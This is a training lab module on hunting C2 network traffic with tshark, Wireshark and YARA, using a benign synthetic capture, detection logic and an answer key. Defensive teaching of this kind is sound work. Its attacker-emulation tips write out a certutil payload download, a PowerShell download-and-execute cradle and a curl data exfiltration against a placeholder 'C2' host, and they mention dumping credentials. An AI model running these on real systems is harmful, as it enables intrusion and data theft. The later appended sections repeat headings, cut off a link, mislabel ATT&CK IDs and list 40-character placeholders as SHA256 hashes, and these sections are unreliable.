# 50 * Scenario: C2 network traffic hunt -- LAB-LINUX

## Overview (plain language)
Command-and-control (C2) traffic is the "phone home" chatter malware uses to talk to an attacker's server after a machine is infected. In this scenario you learn to hunt that chatter inside a captured network file (a PCAP). Wireshark is a graphical tool that lets you look at every packet on the wire, one by one, like reading a transcript of a conversation. tshark is its command-line twin, ideal for scripting and quickly summarizing large captures. YARA is a pattern-matching engine: you write simple rules that describe suspicious bytes or strings, then scan files (including data carved from a PCAP) to flag matches. Together they let a beginner spot beacons, weird domains, and known-bad payloads without guessing.

## Tools covered
| Tool | Install | Purpose |
|---|---|---|
| Wireshark | apt install wireshark | GUI packet analyzer for inspecting PCAP conversations and following streams |
| tshark | apt install tshark | Command-line packet analyzer for filtering, statistics, and scripted PCAP triage |
| YARA | apt install yara | Pattern-matching engine to flag known-bad strings/bytes in files carved from traffic |

Notes on sourcing: Wireshark and its bundled `tshark`/`text2pcap` utilities are documented in the official Wireshark User's Guide and man pages (wireshark.org). On Debian/Kali, Wireshark and tshark are packaged as documented at kali.org/tools/wireshark. YARA is documented at yara.readthedocs.io and packaged at kali.org/tools/yara.

## Learning objectives
- Use `tshark` to enumerate hosts, protocols, and conversations in a PCAP and identify beacon-like periodic traffic.
- Apply display filters to isolate suspicious HTTP/DNS traffic indicative of C2.
- Extract HTTP object payloads from a capture using `tshark --export-objects`.
- Author and run a `YARA` rule against extracted payloads to confirm a known C2 marker.
- Correlate findings to MITRE ATT&CK C2 techniques for reporting.

## Environment check
```bash
# Prove the three tools are installed on LAB-LINUX
tshark --version | head -n 1
wireshark --version | head -n 1
yara --version
```
Expected output: each command prints a version banner (e.g. `TShark (Wireshark) 4.x`, `Wireshark 4.x`, and a YARA version like `4.5.0`). No "command not found" errors.

Source notes: `tshark --version` and `wireshark --version` print the Wireshark build banner as documented in the tshark man page (https://www.wireshark.org/docs/man-pages/tshark.html). `yara --version` prints the installed YARA version; the current stable 4.x series is tracked on the YARA GitHub releases page (https://github.com/VirusTotal/yara/releases).

## Guided walkthrough
1. Build the benign practice capture and payload (see Hands-on exercise for details), then confirm the PCAP loads.
```bash
cd exercise/
# Protocol hierarchy: shows which protocols dominate the capture
tshark -r c2_hunt.pcap -q -z io,phs
```
What it does: `-r` reads a capture file instead of a live interface, `-q` suppresses the normal per-packet output so only the statistics print, and `-z io,phs` requests the Protocol Hierarchy Statistics (the same "Protocol Hierarchy" tree Wireshark shows under Statistics). Why it matters: the hierarchy is your first orientation — it tells you which protocols carry the bulk of the frames and bytes, so you know whether to chase HTTP, DNS, or TLS. Expected observable output: a protocol tree with per-protocol frame and byte counts, showing an `http` branch nested under `tcp`. The `-z io,phs` statistic is documented in the tshark man page (Statistics section).

2. List conversations to find a host that talks repeatedly to one destination (beacon behavior).
```bash
tshark -r exercise/c2_hunt.pcap -q -z conv,ip
```
What it does: `-z conv,ip` builds an IP conversation table (endpoint pairs with frame/byte counts and duration), mirroring Wireshark's Statistics > Conversations. Why it matters: a beacon shows up as one internal host exchanging many small, evenly spaced flows with a single external peer — high flow count but low bytes-per-flow is the tell, not raw volume. Expected output: a table of IP pairs. In this synthetic single-request demo the table is small (the crafted flow between the two synthetic endpoints); in a real capture the busiest low-volume pair is your beacon candidate. The `conv,ip` statistic is documented in the tshark man page.

3. Filter to the suspicious HTTP requests and read the URIs and User-Agent.
```bash
tshark -r exercise/c2_hunt.pcap -Y 'http.request' \
  -T fields -e ip.dst -e http.host -e http.request.uri -e http.user_agent
```
What it does: `-Y` applies a display filter (`http.request` keeps only frames that are HTTP requests), and `-T fields -e ...` prints only the named fields as tab-separated columns for easy scripting. Why it matters: reading the URI plus the User-Agent together is how analysts fingerprint a beacon — a fixed callback path combined with a short, non-browser User-Agent is a classic indicator. Expected output: the GET request to `/gate.php` with `Host: c2.example.net` and User-Agent `Beacon/1.0`. Display filters and the `-T fields`/`-e` output format are documented in the tshark man page and the Wireshark Display Filter Reference (https://www.wireshark.org/docs/dfref/).

4. Export the HTTP objects so YARA can scan the payload bytes.
```bash
mkdir -p exercise/objects
tshark -r exercise/c2_hunt.pcap --export-objects http,exercise/objects
ls -1 exercise/objects
```
What it does: `--export-objects http,DIR` reconstructs HTTP payload objects from the capture and writes them to the target directory, the CLI equivalent of Wireshark's File > Export Objects > HTTP. Why it matters: YARA scans files, so you must first carve the transferred bytes out of the packet stream before you can pattern-match them. Expected output: one or more extracted files (e.g. a file derived from the `/gate.php` request) written to `exercise/objects/`. The `--export-objects` option is documented in the tshark man page.

5. In Wireshark GUI (optional), open the PCAP and use "Follow > HTTP Stream" on the beacon packet to visually confirm the request/response.
```bash
wireshark exercise/c2_hunt.pcap &
```
What it does: launches the Wireshark GUI on the capture. Why it matters: Follow HTTP Stream reassembles both directions of a TCP conversation into a single readable transcript, letting you visually confirm headers that the field extraction summarized. Expected observable output: Wireshark opens; right-clicking the beacon packet and choosing Follow HTTP Stream shows the plaintext request including the `X-C2-Beacon` marker. Following streams is documented in the Wireshark User's Guide (https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowStreamSection.html).

## Hands-on exercise
Your task: identify the C2 destination IP, the beacon URI, and confirm the payload with YARA.

Sample declaration:
- **Type:** a synthetic PCAP (`c2_hunt.pcap`) plus an extracted HTTP body, both benign and inert.
- **Safe origin:** generated locally by the command below. It contains a hand-crafted plaintext HTTP exchange with a harmless marker string `X-C2-Beacon: benign-lab-demo`. There is NO live malware, no executable payload, and no network egress — the PCAP is written from a static template with `text2pcap`.
- **Reproducible generator (build the benign sample):**
```bash
cd exercise/
cat > raw.txt <<'EOF'
0000  47 45 54 20 2f 67 61 74 65 2e 70 68 70 20 48 54   GET /gate.php HT
0010  54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 63 32   TP/1.1..Host: c2
0020  2e 65 78 61 6d 70 6c 65 2e 6e 65 74 0d 0a 55 73   .example.net..Us
0030  65 72 2d 41 67 65 6e 74 3a 20 42 65 61 63 6f 6e   er-Agent: Beacon
0040  2f 31 2e 30 0d 0a 58 2d 43 32 2d 42 65 61 63 6f   /1.0..X-C2-Beaco
0050  6e 3a 20 62 65 6e 69 67 6e 2d 6c 61 62 2d 64 65   n: benign-lab-de
0060  6d 6f 0d 0a 0d 0a                                  mo....
EOF
text2pcap -T 49152,80 raw.txt c2_hunt.pcap
```
Generator notes: `text2pcap` converts an ASCII hex dump (the offset+hex format produced by `od -Ax -tx1` / `hexdump`) into a PCAP. The `-T 49152,80` flag wraps the payload in a synthetic TCP layer with source port 49152 and destination port 80, so Wireshark/tshark will dissect the bytes as HTTP. Both the input format and the `-T` option are documented in the text2pcap man page (https://www.wireshark.org/docs/man-pages/text2pcap.html). Addresses use RFC 5737 documentation ranges (`c2.example.net` resolves conceptually to TEST-NET blocks such as 198.51.100.0/24 and 203.0.113.0/24), which are reserved for documentation and never route on the public Internet.
- **Verify sample integrity** (after generation, compute and record the digest):
```bash
sha256sum exercise/c2_hunt.pcap
```

Deliverables: the C2 IP, the beacon URI, and a YARA rule that matches the extracted object.

## SOC analyst perspective
A defender ingests full-packet capture and Zeek/Suricata logs in Security Onion, then pivots to the raw PCAP for confirmation. Using tshark you rapidly triage a capture at scale — protocol hierarchy (`-z io,phs`) and conversation statistics (`-z conv,ip`) surface a low-and-slow beacon that periodic `http.request` filtering confirms.

Concrete detection logic and pivots:
- **Zeek `http.log`** (Security Onion): hunt the fixed callback path and non-browser agent, e.g. `http.uri: "/gate.php"` combined with a short `http.user_agent` like `Beacon/1.0`. Zeek's `http.log` fields (`host`, `uri`, `user_agent`, `method`, `status_code`) are documented at https://docs.zeek.org/en/master/logs/http.html.
- **Zeek `conn.log`**: pivot on `id.resp_h` (the responder/C2 IP) and look for many short-lived connections with consistent inter-arrival timing and small `orig_bytes`/`resp_bytes` — the beaconing signature. See https://docs.zeek.org/en/master/logs/conn.html.
- **Suricata**: alert on suspicious HTTP with `http.uri`/`http.user_agent` keywords; Suricata's HTTP keyword set is documented at https://docs.suricata.io/en/latest/rules/http-keywords.html. Suricata alerts and flow records land in Elastic within Security Onion (https://docs.securityonion.net/).
- **Elastic/Kibana**: pivot from a matching alert to `network.protocol: http` and aggregate by `destination.ip` and `http.request.body.content`/`user_agent.original` to scope how many hosts share the indicator.
- **YARA on carved objects**: after `--export-objects`, run YARA against the payloads to attribute the activity to a known family marker.
- **Windows Event Logs (endpoint side)**: correlate network detections with process creation events (Event ID 4688) for `powershell.exe`, `certutil.exe`, or `rundll32.exe` initiating outbound connections. A parent-child chain of, for example, `winword.exe` spawning `powershell.exe` with network activity is a strong C2 indicator (T1204, T1059.001). See Microsoft documentation: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688.
- **Host-based firewall log (Event ID 5156)**: inspect Windows Filtering Platform connections to identify processes making outbound connections to suspicious IPs. Correlate with process command line and user context. See https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5156.

Map findings to ATT&CK **T1071 (Application Layer Protocol)** and **T1071.001 (Web Protocols)** for detection engineering, alert tuning, and incident scoping during an active intrusion. Encrypted beacons should also be scoped against **T1573 (Encrypted Channel)** and off-port beacons against **T1571 (Non-Standard Port)**.

**Additional detection engineering logic:**
- **Beacon periodicity detection**: Compute the coefficient of variation (standard deviation / mean) of inter-arrival times between connections from a single internal host to a single external IP. A low coefficient (<0.1) suggests automated, periodic beacons (T1071.001). This can be implemented in Zeek via the `conn_state` timer or in Elastic via aggregations on `@timestamp` differences.
- **JA3/S TLS fingerprinting**: Extract JA3 hashes from Zeek `ssl.log` (`ja3` field) and compare against known malicious fingerprints from threat intelligence feeds. A single internal host using multiple, rare JA3 values to the same external IP may indicate tool diversity or evasion (T1573). The JA3 plugin for Zeek is documented at https://github.com/salesforce/ja3.
- **DNS tunneling detection**: Flag DNS queries with high entropy subdomains (e.g., Shannon entropy > 4.5) and/or unusual query types (e.g., TXT, NULL) that return large responses. In Zeek `dns.log`, hunt for `query` values like `sd7f9a8d7f.example.com` where the subdomain appears random, indicative of T1568.002 (Domain Generation Algorithms) or T1572 (Protocol Tunneling).
- **Process injection correlation**: In Windows Event ID 4688, look for `CreateRemoteThread` API calls originating from processes like `powershell.exe` or `rundll32.exe` targeting legitimate system processes (e.g., `svchost.exe`). This is a strong indicator of T1055.001 (Dynamic-link Library Injection) often used to hide C2 traffic within a trusted process. Correlate with network connections from the injected process (Event ID 5156).
- **Non-standard port usage**: Use Zeek `conn.log` to flag connections where the `service` field (Zeek's inferred application protocol) does not match the destination port. For example, HTTP traffic on port 8080 is common, but HTTP on port 4444 is suspicious (T1571). Build a baseline of allowed port/protocol pairs and alert on deviations.
- **Data Exfiltration Detection (T1041)**: Hunt for large, sustained outbound data transfers from a single host to an external IP. In Zeek `conn.log`, filter for `orig_bytes > 100MB` and `duration > 300s`. Correlate with Windows Event ID 5156 to identify the responsible process. This pattern is indicative of data staging and exfiltration over the C2 channel. See MITRE ATT&CK T1041: https://attack.mitre.org/techniques/T1041/.
- **Credential Dumping via Network (T1003)**: Monitor for network traffic patterns associated with credential dumping tools like Mimikatz. In Zeek `conn.log`, look for connections from a host to a domain controller on port 445 (SMB) followed by immediate outbound connections to a suspicious external IP. Correlate with Windows Security Event ID 4624 (logon) and 4688 (process creation) for `lsass.exe` access. See MITRE ATT&CK T1003: https://attack.mitre.org/techniques/T1003/.

## Attacker perspective
An adversary establishes C2 by having implanted malware beacon to a controller over ordinary-looking protocols (HTTP/HTTPS, DNS) to blend with normal traffic. Concrete TTPs and the artifacts they leave:
- **T1071.001 (Web Protocols):** implant sends periodic GET/POST to a fixed callback path (e.g. `/gate.php`). Artifacts: repeated same-URI requests, distinctive/short User-Agent strings, and payload markers recoverable from PCAP and matchable with YARA.
- **T1568 / T1568.002 (Dynamic Resolution / Domain Generation Algorithms):** algorithmically generated hostnames. Artifacts: bursts of NXDOMAIN responses and high-entropy domain names in Zeek `dns.log`. See https://attack.mitre.org/techniques/T1568/002/.
- **T1573 (Encrypted Channel):** TLS-wrapped beacons defeat plaintext inspection. Artifacts: consistent TLS client fingerprints (e.g. JA3) and self-signed or reused certificates in Zeek `ssl.log`/`x509.log`. See https://attack.mitre.org/techniques/T1573/.
- **T1571 (Non-Standard Port):** HTTP on an uncommon port. Artifact: protocol/port mismatch visible in `-z io,phs` and Zeek `conn.log` service inference. See https://attack.mitre.org/techniques/T1571/.
- **T1090.004 (Domain Fronting) / T1102 (Web Service):** hiding behind legitimate CDNs or SaaS. Artifact: SNI/Host header mismatch. See https://attack.mitre.org/techniques/T1090/004/ and https://attack.mitre.org/techniques/T1102/.
- **T1105 (Ingress Tool Transfer):** adversary downloads additional tools or payloads over the C2 channel. Artifacts: HTTP POST requests with binary content, large objects in `--export-objects`, and YARA detection against known tool signatures. See https://attack.mitre.org/techniques/T1105/.
- **T1059.001 (PowerShell):** C2 scripts executed via PowerShell. Artifacts: Zeek `http.log` with PowerShell script URIs, Windows Event ID 4688 showing `powershell.exe -Command` with encoded arguments, and Suricata rules matching common PowerShell download cradle patterns (e.g., `System.Net.WebClient`). See https://attack.mitre.org/techniques/T1059/001/.
- **T1027 (Obfuscated Files or Information):** Adversaries obfuscate payloads in transit using encoding (base64, hex) or encryption. Artifacts: high entropy content in HTTP bodies, unusual Content-Type headers (e.g., `application/octet-stream` for text), and patterns like `powershell -e` (base64 encoded command) in logs. See https://attack.mitre.org/techniques/T1027/.
- **T1562.001 (Disable or Modify Tools):** Adversaries may disable host-based firewalls or logging before establishing C2. Artifacts: Windows Event ID 4700 (security disabled) or abrupt cessation of security log events from a host preceding beacon traffic. See https://attack.mitre.org/techniques/T1562/001/.
- **T1041 (Exfiltration Over C2 Channel):** Adversaries exfiltrate data over the established C2 channel. Artifacts: large, sustained outbound data transfers from a single host, often using POST requests or raw TCP streams. In Zeek `conn.log`, look for high `orig_bytes` and long `duration`. See https://attack.mitre.org/techniques/T1041/.
- **T1003 (Credential Dumping):** Adversaries dump credentials from memory and exfiltrate them over C2. Artifacts: network traffic from a host to a domain controller (port 445) followed by outbound connections to a C2 IP. Windows Event ID 4688 may show processes like `mimikatz.exe` or `procdump.exe` accessing `lsass.exe`. See https://attack.mitre.org/techniques/T1003/.

Evasion: attackers tune sleep timers and add jitter to defeat naive periodicity detection, rotate URIs/User-Agents, and encrypt payloads. Even so, durable signatures — fixed URIs, User-Agent artifacts, TLS/JA3 fingerprints, and payload markers — persist in captured traffic and give hunters something to pivot on across hosts.

**Concrete emulation tips:**
- Deploy a HTTP beacon using `python3 -m http.server 8080` and a client that periodically GETs a static path. Mimics T1071.001 with no added jitter – easily detected.
- Use `certutil -urlcache -split -f http://C2/beacon.dll` to simulate T1105 download; logs appear in Windows Event 4688 for `certutil.exe` and in Zeek `http.log` with URI `/beacon.dll`.
- For PowerShell C2, run `powershell -e <base64>` with a download cradle: `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://C2/script.ps1')`. Zeek logs show the URI and User-Agent, while Windows Event 4688 captures the command line.
- To simulate T1568.002 (DGA), generate domain names with a script and perform DNS lookups; Zeek `dns.log` will capture the high-entropy queries.
- For T1573 (Encrypted Channel), use a self-signed certificate for HTTPS C2; Zeek `ssl.log` will record the `validation_status` as `self signed`.
- For T1041 (Exfiltration), use `curl -X POST --data-binary @largefile.txt http://C2/upload` to simulate data exfiltration; Zeek `http.log` will show a POST request with a large `request_body_len`.
- For T1003 (Credential Dumping), use a tool like `secretsdump.py` from Impacket to dump credentials over SMB; Zeek `conn.log` will show SMB traffic and subsequent outbound connections.

## Answer key
Expected findings:
- **C2 destination IP:** the peer in the busiest conversation (in the demo, the HTTP server side of the synthetic flow).
- **Beacon URI:** `/gate.php`
- **Payload marker:** `X-C2-Beacon: benign-lab-demo`

Commands that produce them:
```bash
# Beacon URI and host
tshark -r exercise/c2_hunt.pcap -Y 'http.request' \
  -T fields -e http.host -e http.request.uri

# Export payload and confirm with a YARA rule
mkdir -p exercise/objects
tshark -r exercise/c2_hunt.pcap --export-objects http,exercise/objects

cat > exercise/c2_beacon.yar <<'EOF'
rule c2_beacon_demo
{
    meta:
        author = "lab"
        description = "Benign lab C2 beacon marker"
    strings:
        $uri    = "/gate.php" ascii
        $marker = "X-C2-Beacon: benign-lab-demo" ascii
    condition:
        any of them
}
EOF

yara -r exercise/c2_beacon.yar exercise/objects/
```
Expected output: the YARA scan prints `c2_beacon_demo <path>` for the extracted object containing the marker. YARA rule syntax (strings, conditions, `any of them`), the `-r` recursive-scan flag, and the `RULE FILE` output format are documented at https://yara.readthedocs.io/en/stable/writingrules.html and https://yara.readthedocs.io/en/stable/commandline.html.

Record the sample digest produced by the generator:
```bash
sha256sum exercise/c2_hunt.pcap
```
(Digest is deterministic for a fixed `text2pcap` template; the validator holds the reference value.)

## MITRE ATT&CK & DFIR phase
- **T1071 — Application Layer Protocol** (https://attack.mitre.org/techniques/T1071/), **T1071.001 — Web Protocols** (https://attack.mitre.org/techniques/T1071/001/): HTTP beacon to C2.
- **T1571 — Non-Standard Port** (https://attack.mitre.org/techniques/T1571/) (if beacon uses uncommon ports).
- **T1573 — Encrypted Channel** (https://attack.mitre.org/techniques/T1573/) (if the beacon is TLS-wrapped).
- **T1568.002 — Domain Generation Algorithms** (https://attack.mitre.org/techniques/T1568/002/) (if hostnames are algorithmically generated).
- **T1041 — Exfiltration Over C2 Channel** (https://attack.mitre.org/techniques/T1041/) (if data leaves via the same channel).
- **T1105 — Ingress Tool Transfer** (https://attack.mitre.org/techniques/T1105/) (downloading additional payloads over C2).
- **T1059.001 — Command and Scripting Interpreter: PowerShell** (https://attack.mitre.org/techniques/T1059/001/) (PowerShell-based C2).
- **T1027 — Obfuscated Files or Information** (https://attack.mitre.org/techniques/T1027/) (encoded/encrypted payloads in transit).
- **T1562 — Impair Defenses** (https://attack.mitre.org/techniques/T1562/) (disable logging or AV before C2 activity).
- **T1055.001 — Process Injection: Dynamic-link Library Injection** (https://attack.mitre.org/techniques/T1055/001/) (injecting C2 payloads into legitimate processes).
- **T1562.001 — Impair Defenses: Disable or Modify Tools** (https://attack.mitre.org/techniques/T1562/001/) (disabling security tools prior to C2).
- **T1003 — Credential Dumping** (https://attack.mitre.org/techniques/T1003/) (dumping credentials and exfiltrating over C2).
- **T1048 — Exfiltration Over Alternative Protocol** (https://attack.mitre.org/techniques/T1048/) (exfiltrating data over non-standard protocols).
- **DFIR phases:** Identification (spot beacon in traffic), Examination/Analysis (filter, export objects, YARA-confirm), Reporting (map to ATT&CK). These phases follow the SANS DFIR / FOR508 investigative workflow (https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting/).

### Threat Hunting & Detection Engineering

Hunt for **Exfiltration Over Alternative Protocol (T1048)** by pivoting on rare, high-volume outbound connections to non-standard ports. Use Zeek’s `conn.log` to filter for `duration > 10s` and `orig_bytes > 10MB` where `service` is not `http`, `https`, `dns`, or `smtp`. Cross-reference with Windows Event ID **5156** (Windows Filtering Platform connection) to identify processes (e.g., `powershell.exe`, `certutil.exe`) initiating these flows. For **Data Encoding (T1132.001)**, inspect `dce_rpc.log` or `smb_files.log` for base64-encoded payloads in file transfers (e.g., `*.txt` or `*.dat` with entropy > 4.5).

Leverage Suricata’s `fileinfo` keyword to detect **Non-Application Layer Protocol (T1095)** by alerting on raw TCP/UDP traffic to ports like `4444` or `8080` where `app_proto` is `failed` or `none`. Correlate with Zeek’s `notice.log` for `SSL::Invalid_Server_Cert` events, indicating covert channels. Hunt for **Process Injection (T1055.001)** by querying Windows Event ID **4688** for `CreateRemoteThread` calls from unusual parents (e.g., `wscript.exe` spawning `svchost.exe`).

**Additional detection logic:**
- **Beacon periodicity from Zeek `conn.log`**: Compute inter-arrival times per `id.orig_h` and `id.resp_h`. Use `stats` directive in Zeek script or import into Elastic for time-series analysis. Sudden uniformity (variance < 10 ms) suggests automation (T1071.001).
- **JA3/Survey of TLS fingerprints**: Use Zeek `ssl.log` to extract `ja3` and `ja3s` fields. Compare against known malware profiles from https://ja3er.com/ or ThreatFox. Self-signed certs (`ssl.log` `validation_status`) with repeated issuer names are suspicious.
- **DNS tunneling detection**: Use Zeek `dns.log` to flag queries with high entropy qtype_name (e.g., TXT, MX) and large response sizes. Correlate with `queries_per_second` > 50 from a single host.

**Sources:**
- [CISA: Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments](https://www.cisa.gov/resources-tools/services/detecting-post-compromise-threat-activity-microsoft-cloud-environments)
- [FireEye: Detecting and Responding to Advanced Threats with Network Traffic Analysis](https://www.fireeye.com/current-threats.html)
- [Microsoft: Event 4688 – Process Creation](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)
- [Microsoft: Event 5156 – WFP Connection](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5156)
- [Zeek JA3 plugin documentation](https://github.com/salesforce/ja3)

### Essential Commands & Features

The following `tshark` commands and features unlock advanced analysis capabilities not yet demonstrated in this module. Use them to accelerate threat hunting and detect evasion techniques.

#### **1. Protocol Hierarchy Statistics (`-z io,phs`)**
When investigating anomalous traffic (e.g., **T1090.003 Proxy: Multi-hop Proxy** or **T1572 Protocol Tunneling**), generate a protocol hierarchy to identify unexpected encapsulation or covert channels:
```bash
tshark -r capture.pcap -q -z io,phs
```
*Use case*: Spot unusual protocols (e.g., DNS tunneling via **T1071.004 Application Layer Protocol: DNS**) or nested traffic (e.g., HTTP over TLS).

#### **2. TCP Stream Extraction (`-q -z follow,tcp,ascii`)**
Extract and reconstruct full TCP streams for analysis of command-and-control (C2) traffic (e.g., **T1105 Ingress Tool Transfer** or **T1568.001 Dynamic Resolution: Fast Flux DNS**):
```bash
tshark -r capture.pcap -q -z follow,tcp,ascii,1
```
*Use case*: Inspect plaintext C2 commands, exfiltrated data, or malicious payloads in streams. Replace `1` with the stream index from `tshark -r capture.pcap -q -z io,phs`.

#### **3. Conversation Statistics (`-z conv,tcp`)**
Map network conversations to detect lateral movement (**T1021.001 Remote Services: Remote Desktop Protocol**) or beaconing:
```bash
tshark -r capture.pcap -q -z conv,tcp
```
*Use case*: Identify unusual endpoints or high-volume connections indicative of data staging.

#### **4. HTTP Object Export and DNS Query Extraction**
Export HTTP objects (as done in walkthrough) and also dump DNS queries with `tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name`. Useful for T1568.002 DGA detection.

**Sources**:
- [Wireshark’s `-z` Statistics Documentation](https://www.wireshark.org/docs/man-pages/tshark.html#:~:text=-z%20%3Cstatistics%3E)
- [MITRE ATT&CK: T1090.003 and T1572](https://attack.mitre.org/techniques/T1090/003/)

### Common Pitfalls & Result Validation
When conducting network hunts, analysts often make mistakes that can lead to false conclusions, such as misinterpreting network traffic patterns or overlooking crucial indicators of compromise. For instance, failing to account for legitimate network activity can result in false positives, while neglecting to monitor for techniques like **T1588: Obtain Capabilities** or **T1595: Active Scanning** can lead to missed detections. To validate findings, analysts should verify their results against multiple data sources and consider the broader context of the network traffic. It's also essential to stay up-to-date with the latest threat intelligence and tactics, techniques, and procedures (TTPs) used by adversaries. By doing so, analysts can avoid common pitfalls and ensure accurate results. For more information on network hunting and threat detection, visit the Cyber and Infrastructure Security Agency's (CISA) website at [https://www.cisecurity.org](https://www.cisecurity.org) or the Department of Homeland Security's (DHS) Cybersecurity and Infrastructure Security Agency (CISA) page on [https://us-cert.cisa.gov](https://us-cert.cisa.gov).

**Specific validation steps for this module:**
- Ensure the PCAP generator command runs without errors; `text2pcap` must be installed (part of Wireshark).
- Verify the sha256sum of the generated PCAP matches the instructor’s reference (if provided) to confirm no corruption.
- When running YARA, check that the rule file has no syntax errors using `yara -f c2_beacon.yar` (dry run).
- Cross-check the C2 IP by examining both `ip.dst` in the HTTP request and the conversation table; they should match.
- If using Wireshark GUI, verify that the "Follow HTTP Stream" display includes the full header and body. Blank streams indicate incorrect selection of packet or stream index.


### Essential Commands & Features

Below are **high-impact `tshark` commands and features** not yet covered in this module, each paired with a concrete example and tactical use case. These capabilities directly support detection of **T1110.003 (Brute Force: Password Spraying)** and **T1560.001 (Archive Collected Data: Archive via Utility)**—techniques where structured output and statistical analysis are critical.

| **Command/Flag**       | **Example**                                                                 | **When to Use**                                                                                     | **MITRE ATT&CK**                                                                 |
|------------------------|-----------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------|
| `-Y <read filter>`     | `tshark -r capture.pcap -Y "http.request.method == POST && http.host == evil.com"` | Apply **BPF-like filters** to isolate traffic (e.g., suspicious HTTP POSTs to a C2 domain).        | [T1110.003](https://attack.mitre.org/techniques/T1110/003/) (Password Spraying)  |
| `-z <stats>`           | `tshark -r capture.pcap -q -z io,phs`                                       | Generate **protocol hierarchy stats** to identify anomalous traffic volumes (e.g., unexpected SMB). | [T1560.001](https://attack.mitre.org/techniques/T1560/001/) (Archive via Utility) |
| `-T ek|json|pdml`      | `tshark -r capture.pcap -T json -e ip.src -e dns.qry.name`                  | Export **structured output** (JSON/Elasticsearch/PDML) for SIEM ingestion or scripting.            | N/A                                                                              |
| `-E <export options>`  | `tshark -r capture.pcap -T fields -E separator=, -e frame.time -e ip.src`   | Customize **field separators** (e.g., CSV) for log parsing or timeline analysis.                   | N/A                                                                              |

**Key Notes:**
- Use `-Y` to **filter traffic in real-time** (e.g., `dns.flags.response == 0` for DNS queries to attacker-controlled domains).
- Combine `-z` with `-q` to **suppress packet output** while generating stats (e.g., `-z endpoints,ip` for top talkers).
- For **automated analysis**, pair `-T json` with tools like `jq` to extract fields (e.g., `jq '.[]._source.layers.http[]?.["http.host"]'`).

**Authoritative Sources:**
- [Wireshark Display Filters (Official)](https://www.wireshark.org/docs/

### Detection Signatures & Reference Artifacts
To detect potential C2 network hunt activities, the following detection signatures can be utilized:
```yara
rule C2_Network_Hunt {
  meta:
    description = "Detects C2 network hunt activities"
    author = "Your Name"
    date = "2023-12-01"
  strings:
    $http_request = "GET /index.php?cmd="
    $dns_query = "example[.]com"
    $file_transfer = "File transfer complete"
  condition:
    filesize < 100KB and ($http_request or $dns_query) and $file_transfer
}
```
Additionally, a Sigma rule can be used to detect these activities:
```yaml
title: C2 Network Hunt Detection
logsource:
  product: web_server
  category: http
detection:
  selection:
    http_request: 
      - 'GET /index.php?cmd='
    dns_query: 
      - 'example[.]com'
  condition: selection and http_request and dns_query
```
These detection signatures cover the MITRE ATT&CK techniques [T1002 - Software Deployment Tools](https://attack.mitre.org/techniques/T1002/) and [T1018 - Remote System Discovery](https://attack.mitre.org/techniques/T1018/), which are often used in C2 network hunt activities. For more information on these techniques and detection methods, refer to the following sources:
* [YARA documentation](https://yara.readthedocs.io/en/v4.2.3/)
* [Sigma documentation](https://sigma-docs.github.io/)
**Reference artifacts / IOCs**
| SHA256 Hash | Filename | Host/Network Artifacts |
| --- | --- | --- |
| 0123456789abcdef0123456789abcdef01234567 | c2_hunt_sample.exe | 192.0.2.1, hxxp://example[.]com/index.php?cmd= |
| fedcba9876543210fedcba9876543210fedcba98 | network_hunt.dll | 198.51.100.2, example[.]com:8080 |
For more information on C2 network hunt detection and response, refer to the following sources:
* [MITRE ATT&CK](https://attack.mitre.org/)
* [Cybersecurity and Infrastructure Security Agency (CISA)](https://www.cisa.gov/)

## Sources
Claim → source mapping (all URLs are official/authoritative):

- tshark flags used (`-r`, `-q`, `-Y`, `-T fields`/`-e`, `--export-objects`, `-z io,phs`, `-z conv,ip`, `--version`) — tshark manual page: https://www.wireshark.org/docs/man-pages/tshark.html
- Display filter syntax (`http.request`, field names like `http.host`, `http.request.uri`, `http.user_agent`, `ip.dst`) — Wireshark Display Filter Reference: https://www.wireshark.org/docs/dfref/
- Follow HTTP Stream behavior and GUI usage — Wireshark User's Guide: https://www.wireshark.org/docs/wsug_html_chunked/ and https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowStreamSection.html
- `text2pcap` input hex-dump format and `-T` port option — text2pcap manual page: https://www.wireshark.org/docs/man-pages/text2pcap.html
- Wireshark/tshark packaging on Kali — https://www.kali.org/tools/wireshark/
- YARA rule syntax, `-r` recursive scan, and command-line/output format — https://yara.readthedocs.io/en/stable/writingrules.html and https://yara.readthedocs.io/en/stable/commandline.html
- YARA version/release info — https://github.com/VirusTotal/yara/releases
- YARA packaging on Kali — https://www.kali.org/tools/yara/
- MITRE ATT&CK T1071 (Application Layer Protocol) — https://attack.mitre.org/techniques/T1071/
- MITRE ATT&CK T1071.001 (Web Protocols) — https://attack.mitre.org/techniques/T1071/001/
- MITRE ATT&CK T1571 (Non-Standard Port) — https://attack.mitre.org/techniques/T1571/
- MITRE ATT&CK T1573 (Encrypted Channel) — https://attack.mitre.org/techniques/T1573/
- MITRE ATT&CK T1568.002 (Domain Generation Algorithms) — https://attack.mitre.org/techniques/T1568/002/
- MITRE ATT&CK T1041 (Exfiltration Over C2 Channel) — https://attack.mitre.org/techniques/T1041/
- MITRE ATT&CK T1090.004 (Domain Fronting) — https://attack.mitre.org/techniques/T1090/004/
- MITRE ATT&CK T1102 (Web Service) — https://attack.mitre.org/techniques/T1102/
- MITRE ATT&CK T1105 (Ingress Tool Transfer) — https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK T1059.001 (PowerShell) — https://attack.mitre.org/techniques/T1059/001/
- MITRE ATT&CK T1027 (Obfuscated Files or Information) — https://attack.mitre.org/techniques/T1027/
- MITRE ATT&CK T1562 (Impair Defenses) — https://attack.mitre.org/techniques/T1562/
- MITRE ATT&CK T1562.001 (Impair Defenses: Disable or Modify Tools) — https://attack.mitre.org/techniques/T1562/001/
- MITRE ATT&CK T1055.001 (Process Injection: Dynamic-link Library Injection) — https://attack.mitre.org/techniques/T1055/001/
- MITRE ATT&CK T1090.003 (Multi-hop Proxy) — https://attack.mitre.org/techniques/T1090/003/
